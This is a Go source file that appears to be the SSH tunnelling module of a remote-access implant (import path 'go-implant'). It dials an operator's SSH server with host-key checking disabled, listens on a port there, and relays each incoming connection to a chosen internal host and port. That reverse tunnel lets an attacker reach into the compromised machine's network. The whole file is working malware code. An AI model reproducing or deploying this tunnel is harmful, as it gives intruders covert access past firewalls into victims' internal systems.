package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var mutex = &sync.Mutex{}                 // mutex to guard access to tunnel map
var tunnel = make(map[string]*ssh.Client) // open ssh tunnel

// CreateTunnel creates tunnel thread safely if it does not exist
func CreateTunnel(channel chan struct{}, username string, password string, sshHost string, sshPort int) (*ssh.Client, error) {

	mutex.Lock()

	// if tunnel is not up, open it
	thistunnel, ok := tunnel[sshHost+":"+strconv.Itoa(sshPort)]
	if !ok {

		if config.DEBUG {
			log.Println(fmt.Println("Opening new tunnel"))
		}

		tunnel2, err := openTunnel(username, password, sshHost, sshPort)
		if err != nil {
			return nil, err
		}

		// wait until tunnel gets closed and then remove it from the array
		go func() {
			tunnel2.Wait()
			mutex.Lock()
			delete(tunnel, sshHost+":"+strconv.Itoa(sshPort))
			mutex.Unlock()
		}()

		// wait until channel gets closed and then close the tunnel
		go func() {
			<-channel
			tunnel2.Close()
		}()

		// add this tunnel to the map
		tunnel[sshHost+":"+strconv.Itoa(sshPort)] = tunnel2

		thistunnel = tunnel2

	} else {
		if config.DEBUG {
			log.Println(fmt.Println("There is already an open tunnel we can use"))
		}
	}

	mutex.Unlock()

	return thistunnel, nil
}

// OpenTunnel opens a SSH tunnel to username@sshHost:sshPort
func openTunnel(username string, password string, sshHost string, sshPort int) (*ssh.Client, error) {
	// refer to https://godoc.org/golang.org/x/crypto/ssh for other authentication types
	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(60) * time.Second,
	}

	// Connect to SSH remote server using serverEndpoint
	serverConn, err := ssh.Dial("tcp", sshHost+":"+strconv.Itoa(sshPort), sshConfig)
	if err != nil {
		if config.DEBUG {
			log.Println(fmt.Printf("Dial INTO remote server error: %s", err))
		}
		return nil, err
	}

	return serverConn, nil
}

// OpenChannel given tunnel opens a port forward on remote host and forwards connections to destHost:destPort
func OpenChannel(stopchannel chan struct{}, tunnel *ssh.Client, destHost string, destPort int, portchan chan (int)) {

	// Listen on remote server port
	listener, err := tunnel.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		if config.DEBUG {
			log.Println(fmt.Printf("Listen open port ON remote server error: %s", err))
		}
		return

	}

	// spawn goroutine to stop the server when stopchannel gets closed
	go func() {
		<-stopchannel
		listener.Close()
	}()

	// if this is dynamic port on client side, wait for the port number from server
	var destinationPort int
	if destPort == 0 {
		destinationPort = <-portchan
	} else {
		// else just use the destport
		destinationPort = destPort
	}

	// handle incoming connections on reverse forwarded tunnel
	for {

		// Wait for connection from the remoteEndpoint
		client, err := listener.Accept()
		if err != nil {
			if config.DEBUG {
				log.Println(err)
			}
			break
		}

		// Connect to destination host:port
		local, err := net.Dial("tcp", destHost+":"+strconv.Itoa(destinationPort))
		if err != nil {
			client.Close()
			if config.DEBUG {
				log.Println(err)
			}
			break
		}

		// Forward data between the remote Endpoint and local port
		go handleClient(client, local)
	}
}

// Handle local client connections and tunnel data to the remote server
// Will use io.Copy - http://golang.org/pkg/io/#Copy
func handleClient(client net.Conn, remote net.Conn) {
	defer client.Close()
	defer remote.Close()

	chDone := make(chan bool)

	if config.DEBUG {
		log.Println("copying remote->local")
	}
	// Start remote -> local data transfer
	go func() {
		_, err := io.Copy(client, remote)
		if config.DEBUG {
			if err != nil {
				log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
			}
		}
		chDone <- true
	}()

	if config.DEBUG {
		log.Println("copying local->remote.")
	}
	// Start local -> remote data transfer
	go func() {
		_, err := io.Copy(remote, client)
		if err != nil {
			if config.DEBUG {
				log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
			}
		}
		chDone <- true
	}()

	<-chDone
}
